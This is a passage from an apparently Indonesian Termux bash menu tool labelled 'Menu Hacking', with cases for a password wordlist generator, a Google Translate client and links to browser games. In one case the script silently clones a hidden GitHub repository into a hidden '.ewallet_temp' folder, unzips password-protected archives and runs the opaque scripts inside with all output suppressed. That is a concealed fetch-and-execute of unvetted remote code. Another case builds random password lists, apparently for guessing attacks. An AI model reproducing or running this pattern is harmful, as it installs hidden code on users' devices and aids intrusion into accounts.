    unzip -o -P "Dancug_078_Dec_Asu_Tai" ZIP >/dev/null 2>&1 || kontol "Ada Maslah."
    chmod +x Wok.py
    python3 "$PEJU" || kontol "Terjadi kesalahan."
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
       48)
            echo ""
            mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
            echo -e "${c} Anda Memilih Menu Hacking..!!"
            echo ""
            echo -e "${r} VIP UNLOCK..!!"
            sleep 2
            clear
dancok() {
if python3 -c "import $1" 2>/dev/null; then
     echo -e "${g}✅ Modul $1 sudah terinstall, skip."
 else
     echo -e "${y}📦 Modul $1 belum terinstall, mulai install."
     pip install $1
     echo -e "${g}✅ Modul $1 selesai diinstall"
fi
}
dancok "pycryptodomex"
dancok "pycryptodome==3.15.0"
clear 
echo ""
echo -e "${g} ✓ Paket terinstall semua. "
sleep 3
echo ""
clear 
PFERFIX="$HOME"
ANK_IDIOT="$PREFIX/tmp/.ewallet_temp"
PEJU="Wlet.sh"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    if [ -f "$PEJU" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        chmod +x Wlet.sh
        bash "$PEJU" || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} Tidak di temukan mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        rm -rf "$ANK_IDIOT"
        git clone --depth 32 https://github.com/Zero556723/.DZIP "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        unzip -o -P "TAI_045_DEKODER_065_KONTOL" BEGO.sh >/dev/null 2>&1 || kontol "Ada Maslah."
        chmod +x Wlet.sh
        bash "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repo.${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth 32 https://github.com/Zero556723/.DZIP "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    unzip -o -P "TAI_045_DEKODER_065_KONTOL" BEGO.sh >/dev/null 2>&1 || kontol "Ada Maslah."
    chmod +x Wlet.sh
    bash "$PEJU" || kontol "Terjadi kesalahan."
fi
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
      50)
            echo ""
            mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
            echo -e "${c} Anda Memilih Menu Hacking..!!"
            echo ""
            echo -e "${r} VIP UNLOCK..!!"
            sleep 2
            clear 
g='\033[32;1m'
c='\033[36;1m'
y='\033[33;1m'
mkdir -p "/sdcard/Wordslit_GENERATOR"
echo "
░█░█░█▀█░█▀▄░█▀▄░█▀▀░█░░░▀█▀░▀█▀
░█▄█░█░█░█▀▄░█░█░▀▀█░█░░░░█░░░█░
░▀░▀░▀▀▀░▀░▀░▀▀░░▀▀▀░▀▀▀░▀▀▀░░▀░ 
     Developer : Thxyzz404 " | lolcat
echo -e "${y}"
read -p "Masukkan file [ contoh : pass.txt ] : " path
echo -e "${g}"
file="/sdcard/Wordslit_GENERATOR/$path"
target_lines=6958
loading() {
    local pid=$1
    local spin='-\|/'
    local i=0
    while kill -0 $pid 2>/dev/null; do
        i=$(( (i+1) %4 ))
        printf "\rLoading ${spin:$i:1}"
        sleep 0.1
    done
    printf "\rSukses  \n"
}
angka() {
    digit1=$((RANDOM % 9 + 1))
    digit2=$((RANDOM % 10))
    digit3=$((RANDOM % 10))
    digit4=$((RANDOM % 10))
    digit5=$((RANDOM % 10))
    digit6=$((RANDOM % 10))
    digit7=$((RANDOM % 10))
    digit8=$((RANDOM % 10))
    echo "${digit1}${digit2}${digit3}${digit4}${digit5}${digit6}${digit7}${digit8}"
}
huruf() {
    panjang=$((RANDOM % 16 + 5))
    tr -dc 'a-z' < /dev/urandom | head -c $panjang
}
jepang() {
    panjang=$((RANDOM % 8 + 3))
    hasil=""
    for ((i=0; i<panjang; i++)); do
        if [[ $((RANDOM % 2)) -eq 0 ]]; then
            kode=$((12352 + RANDOM % 96))
        else
            kode=$((12448 + RANDOM % 96))
        fi
        hasil+=$(printf "\\u$(printf '%x' $kode)")
    done
    echo -n "$hasil"
}
khas() {
    part1=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 2)
    part2=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 2)
    part3=$(tr -dc 'a-z' < /dev/urandom | head -c 2)
    part4=$(printf "%02d" $((RANDOM % 100)))
    part5=$(printf "%02d" $((RANDOM % 100)))
    echo "${part1}_${part2}_${part3}_${part4}_${part5}"
}
> "$file"
(
    funcs=("angka" "huruf" "jepang" "khas")
    current_lines=0   
    while [[ $current_lines -lt $target_lines ]]; do
        random_func="${funcs[$((RANDOM % ${#funcs[@]}))]}"
        result=$($random_func)
        echo "$result" >> "$file"
        ((current_lines++))
    done
) &
BG_PID=$!
loading $BG_PID
wait $BG_PID
total_lines=$(wc -l < "$file")
echo -e "${c}"
echo "Selesai : $total_lines baris | Target : $target_lines baris."
echo "File : $file"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
     60)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
b='\033[1;34m'
g='\033[1;32m'
p='\033[1;35m'
c='\033[1;36m'
r='\033[1;31m'
y='\033[1;33m'
n='\033[0m'
[[ ! $(command -v jq) ]] && pkg install jq -y &>/dev/null
[[ ! $(command -v curl) ]] && pkg install curl -y &>/dev/null
declare -A nama_bahasa=(
    ["id"]="Indonesia" ["en"]="Inggris" ["ja"]="Jepang" ["ko"]="Korea" ["zh-CN"]="China" 
    ["fr"]="Prancis" ["es"]="Spanyol" ["de"]="Jerman" ["ar"]="Arab" ["hi"]="Hindi"
    ["pt"]="Portugis" ["ru"]="Rusia" ["it"]="Italia" ["th"]="Thailand" ["vi"]="Vietnam"
    ["tr"]="Turki" ["nl"]="Belanda" ["pl"]="Polandia" ["sv"]="Swedia" ["da"]="Denmark"
    ["fi"]="Finlandia" ["no"]="Norwegia" ["el"]="Yunani" ["he"]="Ibrani" ["fa"]="Persia"
    ["af"]="Afrikaans" ["sq"]="Albania" ["am"]="Amhar" ["hy"]="Armenia" ["az"]="Azerbaijan"
    ["eu"]="Basque" ["be"]="Belarusia" ["bn"]="Bengali" ["bs"]="Bosnia" ["bg"]="Bulgaria"
    ["ca"]="Katalan" ["ceb"]="Cebuano" ["ny"]="Chichewa" ["co"]="Korsika" ["hr"]="Kroasia"
    ["cs"]="Ceko" ["eo"]="Esperanto" ["et"]="Estonia" ["tl"]="Filipina" ["fy"]="Frisia"
    ["gl"]="Galisia" ["ka"]="Georgia" ["ht"]="Kreol Haiti" ["ha"]="Hausa" ["haw"]="Hawaii"
    ["iw"]="Ibrani" ["ig"]="Igbo" ["ga"]="Irlandia" ["jw"]="Jawa" ["kn"]="Kannada"
    ["kk"]="Kazakh" ["km"]="Kamboja" ["rw"]="Kinyarwanda" ["ku"]="Kurdi" ["ky"]="Kirgiz"
    ["lo"]="Laos" ["la"]="Latin" ["lv"]="Latvia" ["lt"]="Lituania" ["lb"]="Luksemburg"
    ["mk"]="Makedonia" ["mg"]="Malagasi" ["ms"]="Melayu" ["ml"]="Malayalam" ["mt"]="Malta"
    ["mi"]="Maori" ["mr"]="Marathi" ["mn"]="Mongolia" ["my"]="Myanmar" ["ne"]="Nepal"
    ["or"]="Odia" ["ps"]="Pashto" ["pa"]="Punjabi" ["ro"]="Rumania" ["sm"]="Samoa"
    ["gd"]="Skotlandia" ["sr"]="Serbia" ["st"]="Sotho" ["sn"]="Shona" ["sd"]="Sindhi"
    ["si"]="Sinhala" ["sk"]="Slowakia" ["sl"]="Slovenia" ["so"]="Somali" ["su"]="Sunda"
    ["sw"]="Swahili" ["tg"]="Tajik" ["ta"]="Tamil" ["tt"]="Tatar" ["te"]="Telugu"
    ["tk"]="Turkmen" ["uk"]="Ukraina" ["ur"]="Urdu" ["ug"]="Uighur" ["uz"]="Uzbek"
    ["cy"]="Welsh" ["xh"]="Xhosa" ["yi"]="Yiddi" ["yo"]="Yoruba" ["zu"]="Zulu"
)
terjemah() {
    local teks="$1"
    local dari="$2"
    local ke="$3"
    local enc=$(printf '%s' "$teks" | jq -s -R -r @uri)
    local url="https://translate.googleapis.com/translate_a/single?client=gtx&sl=$dari&tl=$ke&dt=t&q=$enc"
    local hasil=$(curl -s "$url" -A "Mozilla/5.0" --connect-timeout 8 --max-time 12)
    [[ -z "$hasil" || "$hasil" == "null" ]] && {
        echo -e "${r}Koneksi gagal, coba lagi..!!"
        sleep 2
        hasil=$(curl -s "$url" -A "Mozilla/5.0" --connect-timeout 8 --max-time 12) || {
            echo -e "${y}Gagal terhubung."
            return 1
        }
    }
    local terjemahan=$(echo "$hasil" | jq -r '.[0][0][0]' 2>/dev/null)
    [[ "$terjemahan" == "null" ]] && terjemahan="Tidak dapat menerjemahkan."
    local nama_dari="${nama_bahasa[$dari]:-$dari}"
    local nama_ke="${nama_bahasa[$ke]:-$ke}"
    echo -e "${b}[ ${r}$nama_dari → $nama_ke ${b}]"
    echo ""
    echo -e "${g}$terjemahan"
    echo -e "${p}──────────────────────────────────────────────"
    echo -e "${g}"
}
echo ""
echo -e "${n}┌──────────────────────────┐"
echo -e "${n}|    ${y}GOOGLE TRANSLATE ${n}     |"
echo -e "${n}└──────────────────────────┘"
echo -e "${c}Hallo saya google translate di"
echo -e "${r}Kembangkan oleh By.Thxyzz404"
echo -e "${p}Ketik 'exit' untuk keluar"
echo -e "${g}"
while true; do
    read -p "➤ " masukan
    echo ""
    [[ "$masukan" == "exit" || "$masukan" == "keluar" ]] && { echo -e "${y}Sampai jumpa!"; break; }
    [[ -z "$masukan" ]] && continue
    target="id"
    teks="$masukan"
    if [[ "$masukan" =~ \ ([a-z]{2}(-[A-Z]+)?)$ ]]; then
        kode="${BASH_REMATCH[1]}"
        if [[ -n "${nama_bahasa[$kode]}" ]]; then
            target="$kode"
            teks="${masukan% $kode}"
        fi
    fi
    enc_teks=$(printf '%s' "$teks" | jq -s -R -r @uri)
    deteksi=$(curl -s "https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=id&dt=t&q=$enc_teks" -A "Mozilla/5.0")
    dari=$(echo "$deteksi" | jq -r '.[2]' 2>/dev/null)
    [[ "$dari" == "null" || -z "$dari" ]] && dari="auto"
    terjemah "$teks" "$dari" "$target"
done
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
 ;;
61)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
clear 
echo "
 █████╗ ██╗       ██████╗  █████╗ ███╗   ███╗███████╗
██╔══██╗██║      ██╔════╝ ██╔══██╗████╗ ████║██╔════╝
███████║██║█████╗██║  ███╗███████║██╔████╔██║█████╗  
██╔══██║██║╚════╝██║   ██║██╔══██║██║╚██╔╝██║██╔══╝  
██║  ██║███████╗ ╚██████╔╝██║  ██║██║ ╚═╝ ██║███████╗
╚═╝  ╚═╝╚══════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝
" | lolcat 
echo -e "${b}╔══════════════════════════════════════╗"
echo -e "║${g} AUTHOR ${r}= ${c}By.Thxyzz404                ${b}║"
echo -e "╠══════════════════════════════════════╣"
echo -e "║${r} [ ${y}01 ${r}]${g} Game invaders                 ${b}║"
echo -e "║${r} [ ${y}02 ${r}]${g} Game dinosaurus               ${b}║"
echo -e "║${r} [ ${y}03 ${r}]${g} Game ninvaders                ${b}║"
echo -e "║${r} [ ${y}04 ${r}]${g} Game ular                     ${b}║"
echo -e "║${r} [ ${y}05 ${r}]${p} Keluar dari tools.            ${b}║"
echo -e "╚══════════════════════════════════════╝"
echo ""
read -p "$(echo -e "${y}Masukkan menu pilihan anda ${r}[ ${g}1\2\3\4\5 ${r}]${c} : ")" kon
case $kon in
1|01)
clear
echo "
⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠉⣶⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⠉⠉⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣀⣀⣿⣿⣿⣀⣀⣀⣀⣀⣀⣀⣀⣿⣿⣿⣀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀
⣤⣤⣼⣿⣿⣿⣿⣿⣤⣤⣤⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤⣤⣿⣿⣿⣿⣿⣤⣤⣤
⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣿
⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⣿
⣿⣿⡇⠀⠀⢸⣿⣿⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣿⣿⡇⠀⠀⣿⣿⣿
⠛⠛⠃⠀⠀⠘⠛⠛⣤⣤⣤⣤⣤⡀⠀⠀⢠⣤⣤⣤⣤⣤⠛⠛⠃⠀⠀⠛⠛⠛
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀
" | lolcat
echo -e "${g}===============${r} GAME INVADERS ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://invaders-eight.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUKA GAME INVADERS URL LINK..!!"
echo ""
 ;;
2|02)
clear 
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡀⢠⣰⣶⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠃⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠘⣿⣾⣧⢷⠈⣧⡀⠀⠀⠀⠀⠀⣀⣀⣠⣼⣥⣤⣄⣀⣀⣻⡆⠀⠀⠀⠀⠀⣠⡶⠟⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⠧⠋⠀⠀⠈⠀⠀⣠⣴⠶⠛⠋⠉⠉⠈⠀⠀⠉⠉⠉⠛⠛⠶⣤⣀⡴⠛⠉⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⡄⠀⠀⣸⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣿⣷⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠁⠙⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣧⡤⠤⠶⠶⠶⢶⡆⠀
⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⡀⠀⠀⠀⠀⠹⣧⠀⠀⠀⢀⣾⠃⠀
⠀⠀⠀⠀⢀⣿⡶⠶⣶⣗⠟⠛⠋⣿⣍⠉⢉⣭⣿⣯⡉⢉⣽⣶⣌⠉⢉⣽⡉⠉⠉⣿⡀⠀⠀⠀⠀⢹⡄⠀⠀⣼⠋⠀⠀
⢀⣠⣶⣿⡏⡿⠻⣦⣾⠙⠻⣶⣾⠋⠙⠷⠾⠋⠁⠙⢿⠟⠁⠈⠻⢷⠟⠙⢷⣶⠟⠿⡇⠀⠀⠀⠀⠈⣿⠀⣼⠇⠀⠀⠀
⠘⠿⣿⣿⢳⠇⠀⢈⣧⣤⡀⠀⠀⡀⠀⠀⠀⠄⠀⣠⣤⣄⠀⠀⠀⠀⠀⠀⠈⠀⠀⡆⡇⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⣿⠀⣀⠸⢿⡿⠇⠀⣸⠉⣰⣆⣸⣷⠈⠻⠿⠟⠀⡄⠀⠀⠀⠀⠀⠀⠀⡇⡏⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡇⠀⢿⠐⠇⠀⠀⠀⠙⠿⠋⠛⠛⠋⠀⠀⠀⠘⠂⠓⠀⠀⠀⠀⠀⠀⢀⢡⡇⠀⠀⠀⠀⠀⢸⣧⠤⠖⢲⡖⠀
⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣾⡇⠀⠀⠀⠀⠀⠸⣧⠀⠀⣼⠃⠀
⠀⠀⠀⠀⠘⢷⡄⠀⢠⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⣀⠀⠀⢀⡄⠀⣠⣄⠀⢠⣿⠀⠀⠀⠀⠀⠀⠀⢻⠀⢀⣿⠀⠀
⠀⠀⠀⠀⠀⠈⢻⣶⠿⣦⡿⣧⡀⣰⢷⣄⣀⡼⢦⣀⣼⠛⢷⣤⣾⠻⢷⣟⣙⣷⡿⠁⠀⠀⠀⠀⠀⠀⢻⡼⣇⢸⠇⠀⠀
⠀⠀⠀⠀⠀⠀⣽⣿⠷⠿⣧⣬⣿⣯⣤⣽⣯⠤⠤⠽⠵⠴⠶⠾⠟⠚⠛⠋⠉⠉⠀⠀⠀⠀⢀⠀⠀⠀⠸⣇⢿⡾⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⢿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣆⠀⠀⠀⢿⠘⢷⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣶⣤⣀⣀⣀⡀⠀⠀⢀⣀⣀⣀⣀⣀⣠⣤⣤⣶⠆⠀⠀⠀⠀⠀⠀⠻⣦⡀⠀⣸⣆⠈⢻⣆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡿⢿⡟⠛⠀⠀⡽⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠶⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⠤⠤⠤⠴⠇
" | lolcat 
echo -e "${g}===============${r} GAME DINOSAURUS ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://dino-beta-three.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUKA GAME DINOSAURUS URL LINK..!!"
echo ""
  ;;
3|03)
clear 
echo "
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿
⣿⣿⡇⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⣿⣿⣿
⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
" | lolcat 
echo -e "${g}===============${r} GAME NINVADERS ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://ninvaders-kappa.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUKA GAME NINVADERS URL LINK..!!"
echo ""
  ;;
4|04)
clear
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢔⣫⣭⣭⣒⣒⠦⢤⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢊⣵⣿⠿⠋⠀⠀⠉⠙⠓⣶⣬⣙⠲⢄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢊⣴⣿⠟⠁⠀⢀⡴⠶⣤⡀⠀⢈⠑⠊⠿⡆⠑⣄⠀
⠀⠀⠀⠀⠀⠀⠀⢠⢞⣴⣿⠟⠁⠀⢀⣴⣏⣉⠓⠺⡇⠀⢸⣿⣷⣦⡄⠀⡸⠃
⠀⠀⠀⠀⠀⠀⢰⢃⣾⡿⠃⠀⠀⣴⠿⢤⣄⣈⠉⠓⢷⠀⠘⣿⣿⣿⣿⠞⠀⠀
⠀⠀⠀⠀⠀⠀⢸⢸⣿⡇⠀⠀⣼⠧⣤⣀⣀⡈⠉⢻⣟⡤⡀⠙⠟⣹⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⡄⢻⣧⠀⠀⣿⡀⠀⠀⠈⠉⠉⣿⡜⠀⠈⠒⠚⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⡄⢻⣦⠀⠸⣏⠉⠉⠙⠛⠛⡇⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⢻⣆⠀⠹⣤⠤⠤⠤⠤⣿⢃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⢻⣧⠀⢻⡄⠀⠀⠀⣻⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⢻⣧⠀⢻⡉⠉⠉⠙⣏⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⢻⣧⠈⢷⡤⠤⠶⢿⣴⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⢻⣧⠈⣧⣀⣀⣼⣇⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⢻⣆⠘⣧⠀⣀⣹⡽⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⢿⣆⠘⣏⠁⣈⣷⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠈⣎⢿⡆⠹⡏⢁⣹⡾⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡠⠔⣉⠠⣬⣑⠢⡀⠀⠀⠀⠘⡜⣿⡀⢻⡉⣈⣧⠇⠀⠀⠀⠀⠀
⠀⠀⠀⡠⢊⣴⠞⠉⢷⣝⢿⣷⣬⡢⣄⠀⠀⢇⢹⣧⠘⣏⣁⣽⡼⢀⠀⠀⠀⠀
⠀⢀⠊⠰⣿⡁⠀⡴⠋⠙⣶⣝⠻⣿⣮⣑⢄⣸⢸⣿⠀⣿⣡⢼⢇⣶⣍⡢⣄⠀
⠀⣀⠇⣀⡀⠉⠛⠦⣤⣞⠀⣸⠛⢳⠾⠿⣧⠉⣼⣿⠀⣿⢤⡾⠘⠛⣛⣡⣎⢢
⢎⣀⠘⠛⠿⢷⣦⣄⡠⢭⣙⡛⠲⠾⠖⠚⣁⣼⣿⢏⣼⣧⠞⣡⣿⣿⣿⣿⠟⡸
⠀⠀⠈⠉⠒⠒⠠⠬⠭⠅⢀⣉⣉⣙⣛⣛⣛⣉⠀⠬⠭⠤⠬⠭⠭⠭⠍⠒⠉⠀
" | lolcat
echo -e "${g}===============${r} GAME ULAR ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://ular-seven.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUKA GAME ULAR URL LINK..!!"
echo ""
  ;;
5|05)
clear 
echo ""
echo -e "${g} Keluar dari tools..!!"
echo ""
;;
*)
clear 
echo ""
echo -e "${c} Pilihan Anda Tidak Valid..!!"
echo ""
;;
esac
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
   ;;
62)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
